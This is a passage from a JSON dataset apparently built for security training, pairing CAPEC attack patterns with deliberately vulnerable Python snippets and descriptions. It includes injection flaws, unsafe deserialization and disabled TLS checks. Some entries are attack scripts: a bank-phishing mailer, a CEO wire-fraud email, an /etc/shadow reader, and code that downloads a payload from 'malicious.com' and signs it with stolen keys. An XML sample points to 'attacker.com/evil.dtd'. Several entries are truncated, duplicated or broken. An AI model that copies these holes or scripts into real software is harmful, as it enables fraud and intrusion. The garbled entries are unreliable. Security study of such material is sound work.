        "code_snippet": "class InsecureProtocolClient:\n    def __init__(self):\n        self.supported_ciphers = ['null', 'rc4', 'des', 'aes256']\n        self.session_key = None\n    \n    def negotiate_encryption(self, server_ciphers):\n        # Vulnerable: accepts weakest common cipher\n        common_ciphers = set(self.supported_ciphers) & set(server_ciphers)\n        self.session_key = common_ciphers.pop()  # Takes first available\n    \n    def send_data(self, sensitive_data):\n        if self.session_key == 'null':\n            # Vulnerable: sends data in cleartext\n            return sensitive_data.encode()\n        elif self.session_key == 'rc4':\n            # Vulnerable: uses weak RC4 encryption\n            key = b'fixed_key_123'  # Hardcoded key\n            return bytes([b ^ key[i % len(key)] for i, b in enumerate(sensitive_data.encode())])\n        \n    def process_protocol_header(self, data):\n        # Vulnerable: assumes fixed memory layout\n        header = data[:8]\n        security_id = int.from_bytes(header[4:8], 'little')\n        # Incorrect conversion of security identifiers\n        return {'access_level': security_id & 0xFF}",
        "description": "This code demonstrates multiple protocol-related vulnerabilities including weak encryption negotiation that can lead to algorithm downgrade attacks, cleartext transmission of sensitive data, use of weak encryption algorithms, unsafe assumptions about memory layout, and incorrect handling of security identifiers. The code allows negotiation to weaker ciphers, potentially transmits data without encryption, uses weak RC4 encryption with a hardcoded key, and makes unsafe assumptions about protocol header layout."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "from flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/load_module')\ndef load_module():\n    module_path = request.args.get('module')\n    if module_path:\n        try:\n            with open(module_path, 'r') as f:\n                code = f.read()\n                exec(code)\n            return 'Module loaded successfully'\n        except Exception as e:\n            return str(e)\n    return 'No module specified'\n\n@app.route('/include_php')\ndef include_php():\n    php_file = request.args.get('file')\n    os.system(f'php -f {php_file}')\n    return 'PHP file included'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable code allows remote code inclusion and execution through two endpoints. The '/load_module' endpoint accepts a module path parameter and executes any code from that path without validation. The '/include_php' endpoint executes PHP files without sanitizing the file parameter, enabling PHP remote file inclusion. The code lacks input validation, path traversal checks, and allows arbitrary code execution, making it susceptible to remote file inclusion attacks."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\ndef send_spoofed_email(recipient, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = 'ceo@company.com'  # Spoofed sender\n    msg['To'] = recipient\n\n    # Unencrypted connection without proper authentication\n    smtp_server = smtplib.SMTP('smtp.server.com', 25)\n    smtp_server.sendmail(msg['From'], recipient, msg.as_string())\n    smtp_server.quit()\n\n# Usage\nsend_spoofed_email('employee@company.com',\n                   'Urgent: Wire Transfer Required',\n                   'Please wire $50,000 to account XX-XXXX immediately.')",
        "description": "This code demonstrates email spoofing by sending emails with a falsified 'From' address without proper sender authentication. It uses an unencrypted SMTP connection and lacks proper verification of the message source, allowing an attacker to impersonate trusted entities. The code embodies vulnerabilities related to improper authentication, source verification, and message integrity checks in communication channels."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "\"\"\"\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\ndef send_spoofed_email(target_email):\n    # Create spoofed email message\n    msg = MIMEMultipart()\n    msg['From'] = 'security@legitbank.com'  # Spoofed sender\n    msg['To'] = target_email\n    msg['Subject'] = 'Account Security Alert'\n    \n    body = '''\n    Dear Valued Customer,\n    \n    We detected unusual activity in your account.\n    Please verify your identity by clicking the link below:\n    \n    http://malicious-site.com/verify\n    \n    Bank Security Team\n    '''\n    \n    msg.attach(MIMEText(body, 'plain'))\n    \n    # Connect to SMTP server without proper authentication\n    server = smtplib.SMTP('smtp.evil-server.com', 587)\n    server.starttls()\n    server.login('attacker@evil-server.com', 'password123')\n    \n    # Send email with spoofed headers\n    server.send_message(msg)\n    server.quit()\n\n# Target multiple users\ntargets = ['victim1@email.com', 'victim2@email.com']\nfor target in targets:\n    send_spoofed_email(target)\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates principal spoofing through email spoofing. It creates a phishing email that appears to come from a legitimate bank but actually originates from a malicious server. The code shows multiple vulnerabilities: spoofed sender identity (CWE-290), weak authentication with the SMTP server (CWE-1390), incorrect destination specification (CWE-941), and no proper entity authentication (CWE-322). The email headers are forged to deceive recipients about the true sender's identity.\"",
        "description": "\"This vulnerable code demonstrates principal spoofing through email spoofing. It creates a phishing email that appears to come from a legitimate bank but actually originates from a malicious server. The code shows multiple vulnerabilities: spoofed sender identity (CWE-290), weak authentication with the SMTP server (CWE-1390), incorrect destination specification (CWE-941), and no proper entity authentication (CWE-322). The email headers are forged to deceive recipients about the true sender's identity.\""
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "from flask import Flask, session, redirect, request\nimport random\n\napp = Flask(__name__)\napp.secret_key = 'hardcoded_secret_key'\n\nactive_sessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    if username and password:\n        # Generate predictable session ID\n        session_id = str(random.randint(1000, 9999))\n        # No session expiration set\n        session['user_id'] = session_id\n        active_sessions[session_id] = username\n        # Not invalidating existing sessions\n        return 'Login successful'\n    \n@app.route('/check_auth')\ndef check_auth():\n    session_id = session.get('user_id')\n    if session_id in active_sessions:\n        return f'Authenticated as {active_sessions[session_id]}'\n    return 'Not authenticated'\n\napp.run(host='0.0.0.0', port=5000)",
        "description": "This vulnerable code demonstrates session forgery by using predictable session IDs, hardcoded secrets, lack of session expiration, and failure to invalidate existing sessions. The session management is weak due to using a simple random number for session IDs, no HTTPS enforcement, and maintaining sessions in a simple dictionary without proper cleanup. An attacker could predict or forge session IDs to hijack user sessions."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "def expand_data(data, depth=0):\n    if depth > 100:\n        return data\n    expanded = {\n        'nested': [\n            {'data': [expand_data(data, depth + 1) for _ in range(3)]}\n            for _ in range(3)\n        ],\n        'metadata': {\n            'timestamp': str(time.time()),\n            'references': [{'id': i, 'value': 'x' * 1000} for i in range(100)]\n        }\n    }\n    return expanded\n\ndef process_request(user_input):\n    processed_data = expand_data(user_input)\n    return json.dumps(processed_data)  # No size limiting or validation",
        "description": "This code demonstrates a vulnerability where user input triggers nested data expansion without proper limits. The recursive function creates deeply nested structures with multiple branches and large data elements, potentially causing exponential memory growth. The lack of size validation and resource limits makes it susceptible to denial of service attacks through memory exhaustion."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.errorhandler(404)\ndef page_not_found(error):\n    # Retrieving user input from URL parameter\n    user_input = request.args.get('q', '')\n    \n    # Vulnerable error template that directly embeds user input\n    error_template = '''\n    <html>\n        <h1>Error 404: Page Not Found</h1>\n        <p>Could not find: ''' + user_input + '''</p>\n        <img src=\"''' + user_input + '''\">\n        <div>Search results for: ''' + user_input + '''</div>\n    </html>\n    '''\n    \n    return render_template_string(error_template), 404\n\nif __name__ == '__main__':\n    app.run(debug=True)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable error handling page that directly embeds user-controlled input into the error template without proper sanitization. The application accepts a query parameter 'q' and reflects it in multiple locations within the error page HTML, including an img tag's src attribute. An attacker can exploit this by crafting malicious URLs containing JavaScript code, which gets executed when the error page is rendered, leading to XSS vulnerabilities.\"",
        "description": "\"This code demonstrates a vulnerable error handling page that directly embeds user-controlled input into the error template without proper sanitization. The application accepts a query parameter 'q' and reflects it in multiple locations within the error page HTML, including an img tag's src attribute. An attacker can exploit this by crafting malicious URLs containing JavaScript code, which gets executed when the error page is rendered, leading to XSS vulnerabilities.\""
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "\"\"\"\ndef filter_html_content(user_input):\n    # Incomplete blacklist of disallowed tags\n    blacklist = ['script', 'alert', 'onerror']\n    \n    # Flawed filtering that only checks exact matches\n    for banned in blacklist:\n        if banned in user_input.lower():\n            return user_input.replace(banned, '')\n            \n    # Allow input to pass through if no exact matches found\n    return user_input\n\ndef render_page(content):\n    template = f\\\"\\\"\\\"\n    <html>\n        <body>\n            {content",
        "description": "\"This code demonstrates a vulnerable HTML content filter that can be bypassed using alternate case variations of script tags. The blacklist implementation is incomplete and case-sensitive, allowing malicious scripts to pass through when using mixed case (like 'ScRiPt'). The code also fails to properly sanitize HTML special characters and template expressions, making it susceptible to XSS attacks through various syntax variations.\""
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "def process_user_input(user_input):\n    # Disabled input validation for 'performance reasons'\n    '''\n    # Original input validation removed\n    if len(user_input) > 1000:\n        return None\n    if not user_input.isalnum():\n        return None\n    '''\n    \n    # Direct use of unvalidated input in SQL query\n    query = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n    \n    # Direct use of unvalidated input in command execution\n    import os\n    os.system(f'echo {user_input} >> log.txt')\n    \n    # Parse and process XML without validation\n    from xml.etree.ElementTree import fromstring\n    xml_data = fromstring(user_input)\n    \n    return query",
        "description": "This vulnerable code demonstrates a scenario where input validation and filtering mechanisms have been disabled or removed, leading to multiple security issues. The code accepts user input without any validation and uses it directly in SQL queries (SQL injection), command execution (command injection), and XML parsing (XML injection). The commented-out validation code shows that safety checks were intentionally removed, making the application susceptible to various injection attacks and malformed input processing."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import yaml\nimport os\nclass UserData:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\ndef load_user_config(yaml_file):\n    with open(yaml_file, 'r') as f:\n        data = yaml.unsafe_load(f)\n    return data\n\ndef process_user_data(config_file):\n    user_config = load_user_config(config_file)\n    if 'external_config' in user_config:\n        ext_file = user_config['external_config']\n        # Vulnerable: blindly loading external reference\n        with open(ext_file, 'r') as f:\n            sensitive_data = f.read()\n    return UserData(user_config['username'], sensitive_data)",
        "description": "This code demonstrates unsafe deserialization of YAML data containing external references. It uses yaml.unsafe_load() which allows loading of arbitrary files through external references, and processes untrusted external data without validation. The UserData class contains sensitive information but doesn't implement proper serialization controls. The code blindly opens and reads external files specified in the YAML configuration, potentially allowing access to unauthorized system files."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "class MaliciousClient:\n    def __init__(self):\n        self.auth_token = None\n\n    def authenticate(self):\n        # Bypass normal authentication\n        self.auth_token = 'fake_token'\n        return True\n\n    def send_request(self, target_service):\n        if not self.auth_token:\n            self.authenticate()\n\n        # Manipulate expected protocol\n        payload = {\n            'auth_token': self.auth_token,\n            'command': 'get_user_data',\n            'bypass_checks': True,\n            'admin_override': True\n        }\n\n        # Create unexpected resource usage\n        while True:\n            response = target_service.process_request(payload)\n            if 'error' in response:\n                # Modify payload to bypass server restrictions\n                payload['alternate_path'] = '../../../sensitive_data'\n                continue\n            break\n\n        return response",
        "description": "A malicious client implementation that bypasses server-side authentication, manipulates expected protocol behavior, and attempts to create emergent resources through unexpected usage patterns. The client includes hidden functionality to bypass security checks and manipulate server assumptions about client behavior."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import winreg\n\ndef modify_registry():\n    # Store sensitive data in cleartext\n    sensitive_data = 'admin_password123'\n    \n    try:\n        # Open registry key without proper authorization checks\n        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\MyApp')\n        \n        # Directly modify configuration settings without validation\n        winreg.SetValueEx(key, 'AuthToken', 0, winreg.REG_SZ, sensitive_data)\n        winreg.SetValueEx(key, 'SecurityLevel', 0, winreg.REG_DWORD, 0)\n        \n        # Modify lock bits without proper checks\n        winreg.SetValueEx(key, 'LockBit', 0, winreg.REG_DWORD, 0)\n        \n        # Store encrypted data without integrity validation\n        encoded_data = sensitive_data.encode('base64')\n        winreg.SetValueEx(key, 'EncryptedConfig', 0, winreg.REG_BINARY, encoded_data)\n        \n    except WindowsError:\n        pass\n    finally:\n        if 'key' in locals():\n            key.Close()",
        "description": "A vulnerable registry manipulation implementation that allows unauthorized modification of system settings, stores sensitive data in cleartext, fails to protect lock bits, and lacks proper integrity checks for encrypted data. The code demonstrates multiple security issues including external control of system settings, cleartext storage, and improper protection of security-relevant inputs."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "\"\"\"\nimport os\nfrom flask import Flask, session, request\n\napp = Flask(__name__)\napp.secret_key = 'secret123'\n\n# Vulnerable cache storing sensitive user data\nuser_cache = {",
        "description": "\"This code demonstrates a vulnerable caching implementation where sensitive user information (passwords and credit card numbers) is stored in an unencrypted in-memory cache. The cache is accessible through an endpoint that could potentially be exploited. The code lacks proper cache controls, encryption of sensitive data, and proper cache clearing mechanisms, making it susceptible to information disclosure attacks.\""
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "class ClientAuthenticator:\n    def __init__(self):\n        self.credentials = {\n            'admin': 'password123',\n            'user': 'secret'\n        }\n        \n    def authenticate(self, username, password):\n        # Client-side only authentication\n        if username in self.credentials and self.credentials[username] == password:\n            token = f'{username}:{password}'.encode('base64')\n            return {'authenticated': True, 'token': token}\n        return {'authenticated': False}\n    \n    def verify_token(self, token):\n        # Vulnerable token verification\n        try:\n            decoded = token.decode('base64')\n            username, password = decoded.split(':')\n            return self.authenticate(username, password)['authenticated']\n        except:\n            return False",
        "description": "This code demonstrates vulnerable client-side authentication where credentials are stored and verified locally, making it susceptible to bypass and replay attacks. The authentication tokens are weakly encoded and can be easily intercepted and replayed. The implementation lacks server-side verification and stores credentials in plaintext."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import os\nimport subprocess\n\ndef sign_code(code_file):\n    # Hard-coded signing credentials\n    private_key = 'stolen_private.key'\n    certificate = 'stolen_cert.pem'\n    password = 'secretpass123'\n    \n    # Insecure file permissions for sensitive credentials\n    os.chmod(private_key, 0o777)\n    os.chmod(certificate, 0o777)\n    \n    # Download additional code without integrity checks\n    malicious_payload = subprocess.check_output(['curl', 'http://malicious.com/payload.exe'])\n    with open('payload.exe', 'wb') as f:\n        f.write(malicious_payload)\n    \n    # Sign malicious code with stolen credentials\n    cmd = f'signtool sign /f {private_key} /p {password} /t http://timestamp.com {code_file}'\n    subprocess.call(cmd, shell=True)\n    \n    return True\n\ndef verify_signature(signed_file):\n    # Client-side only verification\n    return True  # Always returns true, bypassing actual verification",
        "description": "This code demonstrates the exploitation of stolen code signing credentials by using hard-coded private keys and certificates with insecure permissions. It downloads potentially malicious code without verification and signs it using the stolen credentials. The verification is bypassed through weak client-side authentication."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "class OnlineStore:\n    def __init__(self):\n        self.discount_code = 'SAVE50'\n\n    def apply_discount(self, price, client_validation_token):\n        # Client is expected to validate the discount code\n        # Server blindly trusts the client's validation result\n        return price * 0.5\n\n    def process_payment(self, amount, payment_validation):\n        # Server relies on client-side payment validation\n        # No server-side validation performed\n        if payment_validation['status'] == 'verified':\n            return 'Payment processed successfully'\n        return 'Payment failed'\n\n# Client-side code (easily modifiable)\ndef client_validate_discount(code):\n    # This validation can be bypassed or modified\n    return {'valid': True, 'token': 'validated_12345'}\n\n# Usage\nstore = OnlineStore()\nprice = 100\nfake_validation = {'status': 'verified'}\n# Attacker can bypass client validation and directly call server methods\ndiscounted_price = store.apply_discount(price, 'fake_token')\nresult = store.process_payment(discounted_price, fake_validation)",
        "description": "This code demonstrates a vulnerable e-commerce system that relies on client-side security controls. The server trusts client-side validation for discount codes and payment processing without implementing proper server-side verification. An attacker can bypass these controls by directly calling server methods with manipulated data, potentially getting unauthorized discounts or processing invalid payments."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "# Server-side code\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\nITEM_PRICE = 100.00\n\n@app.route('/calculate_total', methods=['POST'])\ndef calculate_total():\n    try:\n        quantity = request.json.get('quantity')\n        client_total = request.json.get('total')\n        \n        # Vulnerable: Relies on client-side calculation without server validation\n        if client_total is not None:\n            # Accepts client's calculation without verification\n            final_amount = client_total\n            \n            return jsonify({\n                'status': 'success',\n                'total': final_amount\n            })\n    except Exception as e:\n        return jsonify({'error': str(e)})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable code demonstrates a server that relies on client-side calculations for monetary transactions. The server accepts a total amount calculated by the client without performing its own validation or calculation. An attacker could modify the client-side logic to send an arbitrary total amount, bypassing the actual price calculations. The server blindly trusts the client-provided total, making it susceptible to price manipulation attacks."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "from flask import Flask, request, send_file\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    if file.filename.endswith('.txt'):\n        file.save('uploads/' + file.filename)\n        return send_file('uploads/' + file.filename, \n                        mimetype='text/plain')\n\n@app.route('/display')\ndef display():\n    filename = request.args.get('file')\n    content = '<img src=\"' + filename + '\">\n    return content",
        "description": "This vulnerable code allows file upload without proper MIME type validation and content verification. It trusts the file extension (.txt) but doesn't verify the actual content, allowing attackers to upload files containing malicious scripts. The display route also directly embeds user input into an img tag without sanitization, enabling XSS attacks through malformed image sources. The code incorrectly relies on file extensions and doesn't properly validate content types, making it susceptible to MIME type confusion attacks."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "class WebPage:\n    def __init__(self):\n        self.blacklist = ['<script>', 'javascript:']\n\n    def render_page(self, user_input):\n        # Incomplete blacklist filtering for XSS\n        safe_input = user_input\n        for banned in self.blacklist:\n            safe_input = safe_input.replace(banned, '')\n            \n        # Vulnerable IMG tag handling\n        html = f'''\n        <html>\n            <img src=\"{safe_input}\" />\n            <div>{safe_input}</div>\n        </html>\n        '''\n        \n        try:\n            return html\n        except Exception as e:\n            # Exposing sensitive information in error page\n            return f\"Error processing page: {str(e)}\\nStack: {e.__traceback__}\"",
        "description": "This code demonstrates multiple vulnerabilities: incomplete XSS protection through a limited blacklist, unsafe handling of user input in IMG tag attributes, and exposure of sensitive information in error messages. The blacklist can be bypassed using variations like 'Script' or encoded characters, and the IMG src attribute can be exploited with onerror=javascript:code payloads."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\nimport ctypes\n\nclass SystemExploiter:\n    def __init__(self):\n        self._kernel32 = ctypes.windll.kernel32\n        self._undocumented_feature = 0x1337\n\n    def abuse_functionality(self):\n        # Abuse legitimate system calls to access sensitive information\n        try:\n            # Direct memory manipulation using low-level functions\n            handle = self._kernel32.OpenProcess(0x1F0FFF, False, os.getpid())\n            \n            # Undocumented memory region access\n            buffer = ctypes.create_string_buffer(1024)\n            self._kernel32.ReadProcessMemory(\n                handle,\n                self._undocumented_feature,\n                buffer,\n                1024,\n                None\n            )\n            \n            # Abuse system calls to read sensitive files\n            with open('/etc/shadow', 'rb') as f:\n                system_data = f.read()\n                \n            # Trigger processor instruction sequence for unexpected behavior\n            ctypes.memset(handle, 0xFF, 1024 * 1024)\n            \n            return system_data\n            \n        except Exception:\n            pass",
        "description": "This code demonstrates the abuse of legitimate system functionality by utilizing low-level system calls, undocumented features, and direct memory manipulation to access sensitive system information. It uses ctypes to interface directly with kernel functions, attempts to read protected system files, and performs potentially dangerous memory operations that could lead to unexpected system behavior."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "def read_user_file(filename):\n    base_path = '/var/www/userfiles/'\n    file_path = base_path + filename\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except:\n        return None\n\ndef handle_request(user_input):\n    content = read_user_file(user_input)\n    if content:\n        return content\n    return 'File not found'\n\n# Vulnerable usage example\nuser_supplied_path = '../../../../etc/passwd'\nresult = handle_request(user_supplied_path)",
        "description": "This code is vulnerable to path traversal attacks as it directly concatenates user input to create a file path without sanitization. An attacker can use '../' sequences to traverse up the directory structure and access files outside the intended directory. The code accepts any file path input and doesn't validate or sanitize directory traversal sequences, allowing access to sensitive files like '/etc/passwd'."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "\"\"\"\nimport socket\nimport logging\nimport traceback\n\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\n\ndef handle_request(port):\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('localhost', port))\n    server_socket.listen(1)\n    \n    while True:\n        try:\n            client_socket, address = server_socket.accept()\n            data = client_socket.recv(1024).decode()\n            \n            # Debug logging with sensitive information\n            logging.debug(f'Received data: {data",
        "description": "\"This code demonstrates multiple vulnerabilities including direct socket usage in J2EE context, debug logging of sensitive information, lack of input validation framework, and exposure of detailed error information to clients. The code represents a basic server that logs debugging information and handles requests without proper security measures.\""
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "def process_user_request(request_data):\n    try:\n        username = request_data['username']\n        password = request_data['password']\n        db_connection = mysql.connector.connect(\n            host='localhost',\n            user='admin',\n            password='secretdbpass123',\n            database='users'\n        )\n        cursor = db_connection.cursor()\n        \n        query = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n        cursor.execute(query)\n        \n        logging.error(f'Login attempt: User={username}, Pass={password}, Query={query}')\n        \n    except Exception as e:\n        error_msg = f'Error processing request: {str(e)}\\nStack trace: {traceback.format_exc()}\\nDB Config: {db_connection.get_server_info()}'\n        logging.error(error_msg)\n        return {'error': error_msg}\n    \n    return {'status': 'success'}",
        "description": "This vulnerable code demonstrates poor error handling and logging practices that leak sensitive information. It logs user credentials, SQL queries, and detailed error messages including stack traces and database configuration. When errors occur, it returns verbose error messages to the client. An attacker can deliberately trigger errors through malformed requests to gather system information from logs and error responses."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "class MessageServer:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.bind(('0.0.0.0', 12345))\n        \n    def handle_message(self, data):\n        # No authentication check for critical message handling\n        command = data.decode('utf-8')\n        if command.startswith('ADMIN'):\n            # Processes admin commands without verifying source\n            self.execute_admin_command(command)\n        \n    def start(self):\n        self.socket.listen(5)\n        while True:\n            client, addr = self.socket.accept()\n            # No verification of client identity\n            # No message integrity checking\n            data = client.recv(1024)\n            \n            # Covert channel: Hidden data in timing between messages\n            time.sleep(0.1)\n            if len(data) % 2 == 0:\n                # Secretly transmit binary data through timing\n                time.sleep(0.2)\n                \n            self.handle_message(data)\n            client.close()",
        "description": "This code demonstrates multiple security vulnerabilities in a network communication server. It lacks authentication for critical admin functions (CWE-306), doesn't verify message integrity during transmission (CWE-924), fails to verify the source of communications (CWE-940), allows channel access by non-endpoints (CWE-300), and implements a covert timing channel for hidden data transmission (CWE-514). The server blindly accepts and processes messages, including admin commands, without proper security controls."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import socket\nimport ssl\n\ndef create_insecure_ssl_server():\n    context = ssl.SSLContext()\n    context.verify_mode = ssl.CERT_NONE  # Disable certificate verification\n    context.check_hostname = False       # Disable hostname verification\n\n    server_socket = socket.socket()\n    server_socket.bind(('0.0.0.0', 4433))\n    server_socket.listen(5)\n\n    while True:\n        client_sock, addr = server_socket.accept()\n        ssl_sock = context.wrap_socket(client_sock, server_side=True)\n        \n        # Process sensitive data without proper verification\n        data = ssl_sock.recv(1024)\n        user_credentials = {'username': 'admin', 'password': 'secret123'}\n        ssl_sock.send(str(user_credentials).encode())\n\n        ssl_sock.close()\n\nif __name__ == '__main__':\n    create_insecure_ssl_server()",
        "description": "This code demonstrates multiple SSL/TLS vulnerabilities including disabled certificate verification, lack of proper endpoint authentication, and transmission of sensitive data. The server accepts connections without verifying client certificates, doesn't validate the source of communications, and transmits credentials in an insecure manner. It's vulnerable to man-in-the-middle attacks and replay attacks due to improper channel security configuration."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\n\nclass UDDIClient:\n    def __init__(self, registry_url):\n        self.registry_url = registry_url\n    \n    def lookup_service(self, business_id):\n        # Vulnerable: No validation of XML or authentication\n        xml_request = f'''\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n        <find_business>\n            <businessKey>{business_id}</businessKey>\n        </find_business>\n        '''\n        \n        # Vulnerable: No SSL/TLS verification, no message integrity check\n        response = requests.post(\n            self.registry_url,\n            data=xml_request,\n            verify=False\n        )\n        \n        # Vulnerable: No XML validation against schema\n        root = ET.fromstring(response.text)\n        \n        # Vulnerable: Blindly trust and process response\n        service_endpoint = root.find('.//serviceUrl').text\n        return service_endpoint\n    \n    def process_business_transaction(self, service_url, transaction_data):\n        # Vulnerable: No verification of service authenticity\n        response = requests.post(\n            service_url,\n            json=transaction_data,\n            verify=False\n        )\n        return response.json()",
        "description": "This code demonstrates a vulnerable UDDI client implementation that processes e-business transactions. It contains multiple security flaws including: lack of XML validation against a schema, missing SSL/TLS verification, no message integrity checks, insufficient verification of service authenticity, and inadequate channel security. An attacker could exploit these vulnerabilities to spoof UDDI messages and impersonate legitimate business services."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\n\ndef process_xml_routing(xml_content):\n    try:\n        tree = ET.fromstring(xml_content)\n        routing_path = tree.findall('.//routing/node')\n        \n        for node in routing_path:\n            endpoint = node.get('address')\n            if endpoint:\n                # Blindly forward XML to next node without validation\n                response = requests.post(endpoint, data=xml_content)\n                # Modify response headers to hide routing trace\n                response.headers['X-Original-Route'] = 'direct'\n                \n                # Dangerous: allows external entity processing\n                new_tree = ET.parse(response.content)\n                \n                # XPath injection vulnerability\n                query = f\"//data[id='{node.get('id')}']\"\n                result = new_tree.findall(query)\n                \n        return response.content\n    except Exception as e:\n        return f\"Processing failed: {str(e)}\"\n\n# Usage\nxml_data = '''<?xml version=\"1.0\"?>\n<!DOCTYPE data SYSTEM \"http://attacker.com/evil.dtd\">\n<message>\n    <routing>\n        <node address=\"http://intermediary.com/process\"/>\n        <node address=\"http://external.attacker.com/intercept\"/>\n    </routing>\n    <data>sensitive_content</data>\n</message>'''",
        "description": "This vulnerable code implements an XML routing system that processes XML messages through multiple nodes. It contains several security flaws: missing XML validation, allows XXE attacks through external entity processing, vulnerable to XPath injection, and does not properly validate or sanitize routing endpoints. It blindly forwards requests to specified nodes without verifying their authenticity and modifies response headers to hide the routing trace, enabling confused deputy attacks."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "\"\"\"\nimport socket\nimport ssl\n\nclass InsecureClientServer:\n    def __init__(self):\n        self.supported_algorithms = ['NULL', 'RC4', 'DES', 'AES']\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    def negotiate_security(self, client_algos):\n        # Always select the first common algorithm, even if weaker\n        for algo in client_algos:\n            if algo in self.supported_algorithms:\n                return algo\n        return 'NULL'\n    \n    def authenticate(self, message):\n        # No replay protection, simply checks if message format is correct\n        if len(message) > 0 and message.startswith('AUTH:'):\n            return True\n        return False\n    \n    def start_server(self):\n        self.socket.bind(('0.0.0.0', 12345))\n        self.socket.listen(5)\n        \n        while True:\n            client, addr = self.socket.accept()\n            algo = self.negotiate_security(['NULL'])  # Client can force weak crypto\n            if self.authenticate(client.recv(1024).decode()):\n                client.send(b'Welcome!')\n            client.close()\n\"\"\",\n    \"description\": \"This code demonstrates multiple security vulnerabilities in client-server communication including algorithm downgrade attacks, lack of replay protection, client-side security enforcement, and direct socket usage. The server allows negotiation to weaker encryption algorithms, implements weak authentication that can be replayed, and binds to all interfaces without proper destination verification.\"",
        "description": "\"This code demonstrates multiple security vulnerabilities in client-server communication including algorithm downgrade attacks, lack of replay protection, client-side security enforcement, and direct socket usage. The server allows negotiation to weaker encryption algorithms, implements weak authentication that can be replayed, and binds to all interfaces without proper destination verification.\""
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
